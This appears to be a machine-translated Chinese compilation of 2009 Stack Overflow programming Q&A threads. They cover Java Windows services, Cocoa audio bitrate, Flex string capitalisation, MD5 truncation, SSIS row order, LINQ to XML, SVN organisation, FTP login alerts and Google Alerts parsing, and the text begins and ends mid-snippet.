    top: 0;    // This is the default value, but whatever
    left: 0;   // ^
} 
```

# java - 如何将 java 进程作为 Windows Server 2003 服务运行？

> ID：860383
> 
> 赞同：2
> 
> 时间：2009-05-13T20:56:10.003
> 
> 标签：java, service, windows-server-2003

我正在寻找将 java 应用程序作为 Windows Server 2003 服务运行的最佳方式。我有哪些选择，以及执行此操作的基本一般流程是什么？非常感谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-05-13T20:58:53.023

您可以尝试的一件事是 Tanuki Wrapper：

[http://wrapper.tanukisoftware.org/doc/english/download.jsp](http://wrapper.tanukisoftware.org/doc/english/download.jsp)

该软件基本上将 Java 可执行文件包装成可以由服务控制台调用的东西。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-13T21:02:17.277

一种选择是使用 procrun。这种方法的唯一缺点是文档有点薄。

基本思想很简单。[您可以从http://tomcat.apache.org](http://tomcat.apache.org)获取 procrun.exe（也是 tomcat.exe），然后传递 exe 参数来安装服务。可用参数列在[http://commons.apache.org/daemon/procrun.html](http://commons.apache.org/daemon/procrun.html)

[另一种选择是来自http://wrapper.tanukisoftware.org/doc/english/download.jsp](http://wrapper.tanukisoftware.org/doc/english/download.jsp)的 java 服务包装器，但我过去运气不佳。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-05-13T21:13:10.940

[OW2 consortium](http://forge.ow2.org/projects/javaservice/)有JavaService.exe 。我见过一个软件供应商使用它来将他们的商业 Java 产品部署为 Windows 服务。安装 Windows 服务非常容易：向 JavaService.exe 实用程序发出一个简单的命令。以下是他们在其网站上提供的示例命令：

JavaService.exe -安装“我的服务” c:\j2sdk\jre\bin\server\jvm.dll -Djava.class.path=c:\app\classes.jar -start com.my.ExampleClass -err c:\应用程序\stderr.txt

# objective-c - 如何在可可中获取音频文件的比特率

> ID：860388
> 
> 赞同：4
> 
> 时间：2009-05-13T20:57:21.887
> 
> 标签：objective-c, cocoa, core-audio, bitrate, m4a

我需要从音频文件中获取比特率信息，出于某种原因，带有 kAudioFilePropertyBitRate 常量的 AudioFileGetProperty 函数总是为我返回 0。与 kAudioFilePropertyInfoDictionary 相同，生成的字典不包含比特率信息。如果是 mp3，我会尝试从原始数据中手动获取，但我需要支持不同的文件格式，例如 m4a 等。有没有其他方法可以做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-13T21:19:58.183

如果您正在处理一个文件，您总是可以尝试使用 Spotlight 元数据 API。例如，假设您将音频文件的路径作为 NSString 或 CFStringRef 称为“路径”：

```
MDItemRef item = MDItemCreate( kCFAllocatorDefault, path );
CFNumberRef audioBitrate = MDItemCopyAttribute( item, kMDItemAudioBitrate );
CFNumberRef totalBitrate = MDItemCopyAttribute( item, kMDItemTotalBitrate );
CFRelease( item ); 
```

这并不理想，但至少可以为您提供更多背景信息，以说明其他 API 无法正常工作的原因。

我能想到的唯一另一件事是：kAudioFilePropertyBitRate 仅在 OS X 10.5 中定义。如果您在 10.4 或更早版本上运行，您的代码仍将运行，但 AudioFile 框架根本不知道比特率属性，因此可能会返回零。

# asp.net - 内网实时地图 Asp.net

> ID：860391
> 
> 赞同：0
> 
> 时间：2009-05-13T20:57:42.167
> 
> 标签：asp.net, maps, intranet

我正在创建一个 Intranet 网站，并且我有几个组成个人代码的 asp.net 文本框/ddl。我需要帮助的是根据地址显示地图。有关如何执行此操作的任何示例都将非常有帮助。

我试图获得一个谷歌地图 api 密钥，但你需要一个互联网网站才能获得一个。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T21:02:40.740

我认为您可以在 Google API 注册中输入任何网站地址！

我在 .net 中做了类似的事情，一旦你弄清楚了地图 api，它就可以开始工作了。

查看[文档](http://code.google.com/apis/maps/documentation/index.html)。

这是[参考](http://code.google.com/apis/maps/documentation/reference.html)。

# apache-flex - Flex：将字符串中的单词大写？

> ID：860394
> 
> 赞同：2
> 
> 时间：2009-05-13T20:58:23.993
> 
> 标签：apache-flex, capitalization

我正在尝试在 Flex 中做相当于 PHP 的 ucwords() 的操作。我不希望整个字符串都是大写的，只是每个单词的第一个字母。有人知道方法吗？

谢谢！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-05-13T21:11:49.057

尝试

```
str.replace(/\b./g,function(m){return String(m).toUpperCase()}); 
```

解释：

正则表达式 /\b./g 匹配单词边界，后跟任何字符。所有匹配都将传递给 replace 方法的第二个参数中定义的匿名函数。该函数返回大写的匹配。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2010-01-07T22:05:19.680

这与拉斐尔的回答相同，但没有警告:)

```
str.replace(/\b./g,function(...m):String{return m[0].toUpperCase()}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-05-25T13:14:27.787

接受的答案假定字符串都是小写的。如果您从一个全部大写或随机混合大小写的字符串开始，这将不起作用。

这是一个简单的修改，不需要源字符串以全部小写开头：

```
str.toLowerCase().replace(/\b./g,function(...m):String{return m[0].toUpperCase()}); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2011-09-05T14:57:30.427

我在葡萄牙语中遇到了一些特殊字符的问题，所以我把它改成了这个正则表达式：

```
str.replace(/(^|\s|\t)+\S/g, function(...m):String{return m[0].toUpperCase()}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-19T16:01:30.360

我进行了以下更改以克服一些错误和警告：

str.replace(/\b./g,function(m:String):String{return m.toUpperCase()});

但它给了我一个奇怪的崩溃，说它只有一个参数时有三个参数。

我试图修复正则表达式，但我的 regex-fu 不是很好。所以我踢了。这有效（至少，对于字符串中的第一个单词）。对于多个单词，您必须使用拆分。

str = str.substr(0,1).toUpperCase() + str.substr(1,str.length);

# exception - 如何控制对 jsp:include 中抛出的异常的处理？

> ID：860404
> 
> 赞同：1
> 
> 时间：2009-05-13T20:59:28.843
> 
> 标签：exception, jsp, jspinclude

我有一个 JSP，它通过`<jsp:include>`. 我也有（我认为是）标准错误页面设置。问题是，当包含文件中发生异常时，它不会“冒泡”到包含 JSP。相反，它在处理包含的 JSP 的过程中插入错误页面。

奇怪的是，它甚至没有在发生错误的行插入错误页面的输出。例如，如果我在包含的 JSP 的第 600 行引起异常，我将看到前 300-400 行的输出，然后看到错误页面（在输出的 HTML 中）。

而不是在这种情况下出现的包含文件的前 300-400 行，我更愿意看到的是包含页面的输出根本没有出现，而*只是*错误页面输出。这是可能的，还是包含文件的缓冲有一些问题会阻止它？

哦，我已经尝试在包含标签上设置“flush='true'”，并且我尝试在包含器和包含器上将所有内容都包装在 try/catch 中……但这些都没有帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-25T19:17:40.763

是否使用大缓冲区 ( `<%@ page buffer="1024kb" %>`) 和`flush="false"`包含工作？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-05T15:40:17.263

最初的“冒泡”问题可能取决于 Web 容器。我们使用 Websphere 7，它的工作方式与其他 Websphere 版本不同：包含页面的异常不会传播回包含器 jsp。当没有为包含的页面定义任何错误页面时，异常的消息将打印到输出流中。

对于 websphere 7，我们发现了以下参数，该参数允许异常通过 jsp:include 标记冒泡：com.ibm.ws.webcontainer.dispatcherRethrowSError 来自 fixpack 15。这里是附加信息：[http://pic.dhe。 ibm.com/infocenter/wasinfo/v7r0/index.jsp?topic=%2Fcom.ibm.websphere.express.doc%2Finfo%2Fexp%2Fae%2Frweb_custom_props.html](http://pic.dhe.ibm.com/infocenter/wasinfo/v7r0/index.jsp?topic=%2Fcom.ibm.websphere.express.doc%2Finfo%2Fexp%2Fae%2Frweb_custom_props.html)

如果是其他 Web 容器，我还没有遇到过这个问题。

# language-agnostic - md5 哈希的前 32 位是否与任何其他子字符串一样“随机”？

> ID：860405
> 
> 赞同：12
> 
> 时间：2009-05-13T20:59:31.883
> 
> 标签：language-agnostic, md5, hash

我正在寻找创建一些数据对象的 32 位散列。由于我不想编写自己的散列函数并且 md5 可用，我目前的方法是使用 md5 散列的前 32 位（即前 8 个十六进制数字）。这可以接受吗？

**换句话说，md5 散列的前 32 位是否与任何其他子串一样“随机”？** 或者有什么理由我更喜欢最后 32 位？或者也许将四个 32 位子字符串异或在一起？

一些先发制人的澄清：

*   这些哈希不需要是加密安全的。
*   我不关心 md5 的性能——它的速度足以满足我的需要。
*   这些散列只需要足够“随机”，以至于很少发生冲突。
*   在这个系统中，项目的数量不应超过 10,000（实际上它可能不会达到那么高的一半）。所以在最坏的情况下，遇到任何冲突的概率应该是大约 1%（假设找到了一​​个足够“随机”的散列）。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-05-13T21:03:44.840

对于任何好的散列函数，各个位应该是近似随机的。因此，您应该安全地只使用 MD5 哈希的前 32 位。

或者，您也可以使用计算速度更快的 CRC32（代码大约 20 行）。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2009-05-13T21:03:43.127

> 换句话说，md5 散列的前 32 位是否与任何其他子串一样“随机”？

是的。如果答案是否定的，MD5 就不够安全。（当然，它有一些小的加密弱点，但我不知道任何统计弱点）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2011-04-14T19:02:20.657

这是一个老问题，但它经常出现。答案肯定是否定的，否则 MD5 字符串的长度不需要超过 32 位。

无论如何，一个 MD5 字符串根本不是随机的 - 在相同的输入下它是完全且一致的可重现的（这几乎是反随机的 ;-)）。

它对于您的目的是否足够独特取决于您的目的。

# sql-server-2005 - SSIS 数据流更改记录顺序

> ID：860407
> 
> 赞同：0
> 
> 时间：2009-05-13T20:59:47.127
> 
> 标签：sql-server-2005, ssis, dbf, shape

[我以为我在SQL order by 和 left outer join doesn't have correct order](https://stackoverflow.com/questions/462071/sql-order-by-and-left-outer-join-doesnt-have-correct-order)中问了一个类似的问题，但这略有不同。我正在使用 SSIS 和标准数据流从另一个 SQL-Server 2005 数据库获取数据。我得到的记录的顺序与源表中的顺序不同（实际上是一个视图）。在较旧的 DTS 中，顺序不会改变。

源或目标表或视图没有排序，通常，我认为如果顺序很重要，那么会指定它。我可能必须让某人指定一个顺序，我们可以继续进行，但我们正在处理历史形状文件，如果属性的顺序发生变化，那么形状指向错误的数据。

数据在导入时更改顺序是否有原因？有解决办法吗？

这就是顺序很重要的原因。它适用于地图应用程序，并且属性和形状必须匹配。如果订单发生变化，则项目将无法正确匹配。不幸的是，我无法确定数据的任何顺序，并且我怀疑之前的编码人员假定了一致的顺序，而这才是最重要的。使用 SSIS 的顺序不是相同的顺序，并且它永远不会显式设置。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-05-15T11:31:29.383

如果没有显式子句，`SELECT`则永远无法保证 SQL 服务器语句返回的记录顺序。`ORDER BY`您很幸运，DTS 选择的数据集按您需要的顺序返回了行。

如果源是视图，则这是双重事实，因为正如您所说，视图没有隐含的顺序。即使添加也不能保证实际返回结果集的顺序（请参阅[书籍在线](http://msdn.microsoft.com/en-us/library/ms188385(SQL.90).aspx)条目`TOP 100 PERCENT ... ORDER BY`顶部的注释）。

唯一的解决方法是`ORDER BY`在数据流中的查询中添加一个子句。

从您的问题中尚不清楚您是否在视图中有一组列可以保证返回您需要的顺序 - 如果是这样，请使用有关源数据的更多详细信息更新问题，因为有几种方法可以接近问题。

# asp.net-mvc - 解析错误 ViewMasterPage

> ID：860412
> 
> 赞同：4
> 
> 时间：2009-05-13T21:00:33.130
> 
> 标签：asp.net-mvc, master-pages

我正在尝试实现一个强类型的母版页，并以此页面为例：

[如何使用 ASP.NET MVC 中的基本控制器创建强类型母版页](https://stackoverflow.com/questions/768236/how-to-create-a-strongly-typed-master-page-using-a-base-controller-in-asp-net-mvc)

我的母版页中有以下声明：

`<%@ Master Language="C#" Inherits="System.Web.Mvc.ViewMasterPage<InsTech.ForeSight.Web.Mvc.ModelBase>" %>`

当我尝试运行时，我得到：解析器错误消息：无法加载类型`'System.Web.Mvc.ViewMasterPage<InsTech.ForeSight.Web.Mvc.ModelBase>'`

我不太确定为什么它找不到类型。当我使用 ViewMasterPage 类时，一切都很好，但是当我尝试使用通用版本时，它会爆炸。

有什么建议么

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-05-14T01:15:11.887

InsTech.ForeSight.Web.Mvc.ModelBase 在另一个程序集中吗？如果有，是否被引用？

InsTech.ForeSight.Web.Mvc.ModelBase 是抽象的吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2011-05-16T15:45:31.167

当我的 MVC 母版页位于“视图”文件夹之外（带有我的普通 Web 表单母版页）时，我收到了这个错误，将它移到那里为我解决了这个错误。

**编辑**：抱歉，我没有看到@Whoiskb 已经在上面的评论中发布了相同的答案。把这个答案留给没有阅读所有评论的人:)

# linux - 如何检测ftp连接

> ID：860416
> 
> 赞同：-1
> 
> 时间：2009-05-13T21:01:59.260
> 
> 标签：linux, ftp, shell

我正在使用 vsftpd，我想编写一个 shell 脚本来检测到我的服务器的连接并向我发送一封电子邮件，其中包含登录的人员和时间的信息。我不知道从哪里开始。有人可以指出我正确的方向。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-05-13T21:23:26.727

阅读日志。

[http://www.redhat.com/docs/manuals/enterprise/RHEL-3-Manual/ref-guide/s1-ftp-vsftpd-conf.html](http://www.redhat.com/docs/manuals/enterprise/RHEL-3-Manual/ref-guide/s1-ftp-vsftpd-conf.html)

启用传输日志。

阅读文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-13T21:14:04.870

我不熟悉 vsftpd，但你可以让你的 shell 脚本查看[netstat](http://linux.die.net/man/8/netstat)的输出，看看你是否在端口 21（默认的 ftp 端口）上有任何连接。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T22:19:26.917

最可靠的方法是使用日志分析。如果您使用 OSSEC（免费和开源）之类的工具，它可以在登录、注销、登录失败等发生时运行任何脚本或生成电子邮件警报。

链接：[http ://www.ossec.net](http://www.ossec.net)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-14T04:16:14.383

同样适用于“fail2ban”，尽管这件事的目的是别的（你猜对了）。

J。

# xml - 具有属性的 XML 元素的 LINQ To XML 语法

> ID：860420
> 
> 赞同：2
> 
> 时间：2009-05-13T21:02:53.423
> 
> 标签：xml, vb.net, linq, linq-to-xml

我是一个 LINQ 新手，我在以下方面遇到了一些麻烦。我正在尝试使用 LINQ 对 XML 文件执行查询，并将结果存储在与 XML 匹配的 DataClass 对象列表中。

我有一个这样定义的 XML 文件：

```
<NewDataSet>
    <NewDataTable>
      <Field>Accepted ASNs</Field>
      <Val>59</Val>
      <Order Number="1234" ShipDate="2009/05/21" />
      <Order Number="2190" ShipDate="2009/05/22" />
      <Order Number="1809" ShipDate="2009/05/22" />      
    </NewDataTable>
    <NewDataTable>
      <Field>Rejected ASNs</Field>
      <Val>8</Val>
      <Order Number="2901" ShipDate="2009/05/21" />
      <Order Number="2810" ShipDate="2009/05/24" />
      <Order Number="1419" ShipDate="2009/05/25" />
    </NewDataTable>
    <NewDataTable>
      <Field>Missing ASNs</Field>
      <Val>7</Val>
      <Order Number="2902" ShipDate="2009/05/19" />
      <Order Number="2898" ShipDate="2009/05/20" />
      <Order Number="1296" ShipDate="2009/05/22" />
    </NewDataTable>
 </NewDataSet> 
```

我创建了一个 Data 类来支持这种 XML 格式。我想做的是创建一个 LINQ 查询来获取这 3 条记录并将它们存储到我的 DataClass 的列表中。

为了支持多个 Order 元素，我用“Order”结构的通用列表定义了我的类......它看起来像这样：

```
 Public Class ASNData
        Private _field As String
        Private _value As String
        Private _orders As List(Of Order)

        Public Property Field() As String
            Get
            Set
        End Property

        Public Property Value() As String
            Get
            Set
        End Property

        Public Property Orders() As List(Of Order)
            Get
            Set
        End Property

        Structure Order
            Private _number As String
            Private _date As Date

            Public Property Number() As String
                Get
                Set
            End Property

            Public Property ShippingDate() As Date
                Get
                Set
            End Property
        End Structure
    End Class 
```

我遇到的最大问题是弄清楚如何获取 3 个订单元素并将它们存储到我的订单结构列表中。

谁能指出我正确的方向？

谢谢你。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-05-13T22:08:59.900

这是带有您需要的 LINQ 查询的控制台应用程序的代码。我必须填写你的类和包含结构的 getter 和 setter，但这是经过测试的工作代码。要获取 List(Of ASNData)，只需调用 DataTables.ToList

当然，这适用于任意数量的 Order 元素。

使用结构顺序工作得很好。我会使用一个类，但无需更改它即可工作。

这段代码的关键部分是 LINQ 查询：

```
Dim DataTables = From NewDataTable In TestData...<NewDataTable> _
                 Select New ASNData With {.Field = NewDataTable.<Field>.Value, _
                                          .Value = NewDataTable.<Val>.Value, _
                                          .Orders = (From AnOrder In NewDataTable...<Order> _
                                                     Select New ASNData.Order With _
                                                            {.Number = AnOrder.@Number, _
                                                             .ShippingDate = Date.Parse(AnOrder.@ShipDate)}).ToList} 
```

这是完整的工作控制台应用程序：

```
Module Module1

Sub Main()
    Dim TestData = <NewDataSet>
                       <NewDataTable>
                           <Field>Accepted ASNs</Field>
                           <Val>59</Val>
                           <Order Number="1234" ShipDate="2009/05/21"/>
                           <Order Number="2190" ShipDate="2009/05/22"/>
                           <Order Number="1809" ShipDate="2009/05/22"/>
                       </NewDataTable>
                       <NewDataTable>
                           <Field>Rejected ASNs</Field>
                           <Val>8</Val>
                           <Order Number="2901" ShipDate="2009/05/21"/>
                           <Order Number="2810" ShipDate="2009/05/24"/>
                           <Order Number="1419" ShipDate="2009/05/25"/>
                       </NewDataTable>
                       <NewDataTable>
                           <Field>Missing ASNs</Field>
                           <Val>7</Val>
                           <Order Number="2902" ShipDate="2009/05/19"/>
                           <Order Number="2898" ShipDate="2009/05/20"/>
                           <Order Number="1296" ShipDate="2009/05/22"/>
                       </NewDataTable>
                   </NewDataSet>

    Dim DataTables = From NewDataTable In TestData...<NewDataTable> _
                     Select New ASNData With {.Field = NewDataTable.<Field>.Value, .Value = NewDataTable.<Val>.Value, _
                                                     .Orders = (From AnOrder In NewDataTable...<Order> _
                                                               Select New ASNData.Order With {.Number = AnOrder.@Number, .ShippingDate = Date.Parse(AnOrder.@ShipDate)}).ToList}

    Console.WriteLine(DataTables.Count)
    Console.ReadLine()

End Sub

Public Class ASNData
    Private _field As String
    Private _value As String
    Private _orders As List(Of Order)

    Public Property Field()
        Get
            Return _field
        End Get
        Set(ByVal value)
            _field = value
        End Set
    End Property

    Public Property Value() As String
        Get
            Return _value
        End Get
        Set(ByVal value As String)
            _value = value
        End Set
    End Property

    Public Property Orders() As List(Of Order)
        Get
            Return _orders
        End Get
        Set(ByVal value As List(Of Order))
            _orders = value
        End Set
    End Property

    Structure Order
        Private _number As String
        Private _date As Date

        Public Property Number() As String
            Get
                Return _number
            End Get
            Set(ByVal value As String)
                _number = value
            End Set
        End Property

        Public Property ShippingDate() As Date
            Get
                Return _date
            End Get
            Set(ByVal value As Date)
                _date = value
            End Set
        End Property
    End Structure
End Class

End Module 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-13T21:12:46.497

要获取订单元素（从`NewDataTable`元素），您可以使用

```
 newDataTableElement.Elements("Order") 
```

这将返回一个`IEnumerable<XElement>`- 然后您可以使用它`Select`来正常转换每个。要获取属性，请使用：

```
 element.Attribute("Number").Value
 element.Attribute("ShipDate").Value 
```

这将提供用作字符串的值 - 您可以`XAttribute`为您进行转换：

```
 CType(element.Attribute("Number"), Integer)
 CType(element.Attribute("ShipDate"), DateTime) 
```

我不是 100% 认为这适用于您的日期，因为它可能需要一个完整的日期和时间 - 不过值得一试。否则，只需使用`DateTime.ParseExact`.

我*强烈*建议您重新考虑`Order`成为一个结构 - 特别是一个*可变*结构。有什么理由让它成为一个结构而不是一个类？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-07-06T09:18:26.913

```
XDocument xmlDoc = XDocument.Load(Server.MapPath("Order.xml"));

List<ASNData> lst= (from data in xmlDoc.Root.Elements("NewDataTable")
    select new ASNData
    {
        Field=data.Element("Field").Value,
        Value=data.Element("Val").Value,
        Orders=(from ord in data.Elements("Order")
        select new Order
        {
            Number=ord.Attribute("Number").Value,
            ShippingDate=Convert.ToDateTime(ord.Attribute("ShipDate").Value)
         }).ToList<Order>()
     }).ToList<ASNData>();

foreach(ASNData a in lst)
{

     Response.Write("Field:"+a.Field+"</br>");
     Response.Write("Value:"+a.Value+"</br>");
     Response.Write("Orders:"+"</br>");

     foreach(Order o in a.Orders)
     {
         Response.Write("OrderNum:"+o.Number+"</br>");
         Response.Write("ShipDate:"+o.ShippingDate+"</br>");
     }
} 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2009-05-13T21:15:50.047

```
var result = from order in YourXMLVar.Descendants("NewDataTable")
    .First().Elements("Order") select order; 
```

这应该给你一个订单数组。

然后你应该能够做类似的事情：

```
foreach(var order in result)
{
  int someVal = Convert.ToInt32(order.Attribute("Number").Value);
} 
```

// 编辑：显然，您不会使用 First()，而是会遍历您的订单或您的逻辑要求的任何内容。我使用 First() 是因为它使演示变得简单。

# python - 从 LocalSystem 服务（通过 CreateProcessAsUser）生成的 GUI 应用程序没有焦点

> ID：860428
> 
> 赞同：1
> 
> 时间：2009-05-13T21:04:40.597
> 
> 标签：python, windows-services, tkinter, pywin32

我创建了一项服务，该服务在特定用户的桌面上显示一种启动屏幕，并且仅在该用户登录时（信息亭用户）。

该启动屏幕一旦输入有效代码，就会告诉服务并且服务进入睡眠 x 时间量（取决于代码）。

启动画面简单地退出。现在，当服务唤醒时，它会看到飞溅不再存在，因此启动它。

这一切正常，唯一的问题是启动的应用程序没有焦点，即如果我在记事本中工作并且时间到了，则在记事本后面显示启动画面（虽然是全屏）。

我只需要担心 Windows Vista，我在 Python 中使用 win32 扩展进行编码，但我相信这个问题出在从 LocalSystem 帐户调用时的 CreateProcessAsUser 上。

* * *

### 更新：

“问题”实际上是一个故意限制，以防止像我这样的“烦人”应用程序窃取焦点。

您可以通过设置更改行为： win32gui.SystemParametersInfo(win32con.SPI_SETFOREGROUNDLOCKTIMEOUT, 0, 0) 相当于临时设置注册表值：HKEY_CURRENT_USER\Control Panel\Desktop\ForegroundLockTimeout 这必须作为用户自己完成，所以要么构建它在您正在启动的应用程序中或为您要启动的应用程序构建启动助手。

但是，应用程序可能希望通过使用一些我现在不记得的 API 调用来防止其焦点被盗。

一个可能很好的解决方案是找到当前来自该用户的所有窗口句柄，然后使用这些句柄中的每一个来使用 win32gui.ShowWindow(handle, command) 将其最小化。

尽管对于这个特殊问题，设置锁定超时设置就足够了。

如果有人想知道我是如何设法将应用程序从服务启动到桌面的，这里是[代码的链接](http://blog.dcuktec.com/2009/05/python-on-windows-from-service-launch.html)。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-13T22:18:23.503

您是否尝试过从服务中启动其他进程而不是您自己的进程以查看它是否获得焦点？像记事本一样，看看它是否会从您的浏览器中窃取焦点？如果是这样，也许它的程序可以在启动时收回焦点。

否则我相信它是来自 STARTUPINFO 结构的 wShowWindow 属性， lpStartupInfo 指向的应该控制它。您还需要 dwFlags 中的 STARTF_USESHOWWINDOW 才能使用 nShowWindow。我认为这些值应该是 SW_SHOW，如果你想尝试其他的，它们是为 ShowWindow 函数列出的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-21T09:44:09.150

出于各种非常正当的原因，微软不希望看到服务启动应用程序并窃取焦点，但是我发现以下工作仍然可以完成我想要的。

最初的意图是让一个类似信息亭的应用程序受到像闪屏这样的密码的阻碍，当输入一个 8 个字符的代码时，它会在定义的密码中关闭闪屏一段时间。最初要使用的实际应用程序是由自动启动文件夹启动的。

但是我现在重写它是从我的服务启动的，这样我可以通过从服务中启动一个帮助应用程序来隐藏应用程序，该服务只是隐藏程序并启动启动屏幕，退出启动屏幕后程序返回到以前的状态。

# hyperion - 没有列标题的 Brio 保存文件

> ID：860433
> 
> 赞同：1
> 
> 时间：2009-05-13T21:05:32.047
> 
> 标签：hyperion, brio

如何防止列标题出现在 Hyperion 的 .txt 保存文件中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-21T17:36:31.240

以下是 Oracle/Hyperion 的答案：

您是正确的，标题仍然出现在以*.xls 格式导出的部分上。如果您尝试导出该部分并且不希望出现标题，则需要将其导出为提供的一种 Office 存档格式（Microsoft Office 2000 HTML (* .html) 或 ( *.mhtml)）。无法通过 GUI 选择以 Excel (* .xls) 格式导出文件并且不存在标题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-14T14:14:35.367

在主菜单栏上选择格式。在下拉列表中，有一个“列标题”选项。选择“列标题”选项并取消选中它，从结果中删除列标题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-07-17T03:32:52.663

假设您没有重复的行，一种解决方法是为表/结果集创建一个数据透视部分，并将每一列作为侧标签引入，并关闭所有顶部/侧/角标签。导出枢轴部分。如果您为每一行提取一个唯一标识符，则效果最佳。

# svn - svn组织问题

> ID：860435
> 
> 赞同：0
> 
> 时间：2009-05-13T21:05:43.777
> 
> 标签：svn, organization

我不确定如何组织这些项目，因为它们都相互依赖。

现在它全部在以下结构中，这变得难以管理

```
-trunk
 |-bin - compiled common dlls
 |-lib - static libs for use with common dlls
 |-src - common dll source code
 |-include - headers for common dlls
 |-common.sln - VS 2008 solutions for common dlls
 |-samples
 ||-res - resources for samples
 |||-img
 |||-snd
 ||-c++ - c++ samples for common dlls, tends to double up as tests
 |||-various VS 2008 sample solutions
 ||-py - python versions for some samples
 |||-...
 |-wrappers
  |-python
  ||-bin - compiled python extension dll
  ||-src - source for python wrapper
  -Apps - actaul programs using common dlls, each with its own dir and solution
  |-... 
```

这有很多问题：-1 svn 结构有点乱，例如，我没有真正的方法为一个应用程序创建一个bracnh - 由于使用的文件路径，为任何东西发布版本都是一个巨大的痛苦通过应用程序。例如，python 程序需要知道 python 扩展 dll 在哪里，以及每个公共 dll 在哪里。这些路径在 svn 上与发布时的路径非常不同（它们都可能在一个公共目录中）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-05-13T21:22:08.260

哎呀！

将所有内容划分为单独的项目/dll/库/人工制品 - 无论您想如何称呼它们，并遵循推荐的 SVN 结构：

```
/ (root)
  /Application1
    /branch
    /tag
    /trunk
  /Application2
    /branch
    /tag
    /trunk
  /LibraryX
    /branch
    /tag
    /trunk
  /LibraryY
    /branch
    /tag
    /trunk 
```

然后，如果应用程序希望这些库或依赖项之一位于其结构内的目录中，请使用 svn:external 属性将其拉入。

例如，如果您希望从 LibraryX 编译的 dll 位于 Application1 中名为 dll 的文件夹中，那么您需要在 /Application1/ 的存储库中添加以下 svn:external 属性：

```
svn://repositoryname/LibraryX/buildoutput/ dll 
```

当您签出 Application1 时，您将获得它的所有文件，并且它会在您的工作副本中添加一个名为 dll 的文件夹，该文件夹将从 LibraryX/buildoutput/ 中签出

您还可以将每个项目检出到它自己的文件夹中并挑选某些文件。但这需要稍微不同的方法 - 您将在本地计算机上拥有所有具有相同父文件夹的文件夹，如下所示：

```
Application1 (checked out from svn://repositoryname/Application1/trunk)
LibraryX (checked out from svn://repositoryname/LibraryX/tag/stable) 
```

因此，如果您想从 LibraryX 的构建输出中获取特定文件，您可以添加：

```
svn:externals ../LibraryX/build/thelibfile.dll libfile.dll 
```

..作为 Application1 已签出工作副本的属性，它将从 LibraryX 中提取 libfile.dll 并将其粘贴在 Application1 工作目录的根目录中。

请注意，这样做的一个主要好处是，通过使用标签，您可以让您的应用程序拉入其依赖项的特定标签版本。在上面的示例中，开发人员可以在 Application1 的主干上工作，但使用的是稳定版本的库。当通过重新标记创建库的下一个稳定版本时，只需更新它，它就会在他们的开发工作副本中被安装到所有开发人员的机器上。

当您从本地工作副本中签出并引用外部文件时，外部文件仅适用于单个文件，您不能像使用文件夹一样直接从存储库中执行此操作......但是。

**您只能使用 subversion 版本 1.6.x 引入单个文件外部**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-13T21:20:51.677

一般来说，如果你在一个 subversion 存储库中有多个项目并且它变得混乱，你想做两件事之一：
1）你将它全部合并到一个单一的项目中，因为每个人都在做同样的事情，因此标签和分支适用于所有事情. 这往往是在同一个团队处理所有代码并且项目实际上只是以不同方式编译的组件的情况下完成的。

2）您将不同的项目分开，将它们放在自己的存储库中（或至少将它们拆分在顶部，并在该项目目录下使用自己的主干/分支/标签部分）并完全单独构建它们并将它们发布到存储库，在这种情况下是共享文件系统或 Web 服务器。

在您的特定情况下，看起来您有两个项目，一组通用的库代码和该代码的一些用户。因此，您最终会得到以下顶级结构：

1.  应用
2.  常见的
3.  样品（也许？！）
4.  包装纸

每个项目目录下都有自己的主干、标签、分支结构。它们中的每一个都有一个已编译二进制文件的副本，它代表依赖项目的输出（或引用存储库中的版本），因此您有一种正式的方式来推进依赖关系。

# database - 如何解析来自 Google 快讯的数据？

> ID：860442
> 
> 赞同：32
> 
> 时间：2009-05-13T21:08:43.617
> 
> 标签：database, information-retrieval, google-alerts

首先，除了解析 Google 发送给您的电子邮件的文本之外，您如何将 Google 警报信息输入数据库？

似乎没有 Google Alerts API。

如果您必须解析文本，您将如何解析电子邮件的相关部分？

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2009-05-13T23:30:10.017

创建警报时，将“传递到”设置为“Feed”，然后您可以像使用任何其他 Feed 一样使用 Feed XML。这更容易解析和消化到数据库中。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-11-27T09:02:56.147

```
class googleAlerts{
    public function createAlert($alert){
        $USERNAME = 'XXXXXX@gmail.com';
        $PASSWORD = 'YYYYYY';
        $COOKIEFILE = 'cookies.txt';

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
